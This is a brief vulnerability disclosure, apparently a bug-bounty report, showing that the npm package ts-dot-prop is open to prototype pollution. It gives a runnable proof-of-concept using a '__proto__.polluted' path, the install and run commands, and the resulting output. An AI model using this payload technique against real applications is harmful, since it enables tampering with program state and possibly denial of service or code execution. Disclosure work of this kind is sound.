# Description

`ts-dot-prop` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:
```javascript
// poc.js
const { set } = require('ts-dot-prop')

console.log(`Before: ${{}.polluted}`)
set({}, '__proto__.polluted', true)
console.log(`After: ${{}.polluted}`)
```
2. Execute the following commands in the terminal:
```bash
npm i ts-dot-prop # install vulnerable package
node poc.js # run the PoC
```
3. Check the output:
```
Before: undefined
After: true
```

# Impact

`Prototype Pollution` leads to Information Disclosure/DoS/RCE.

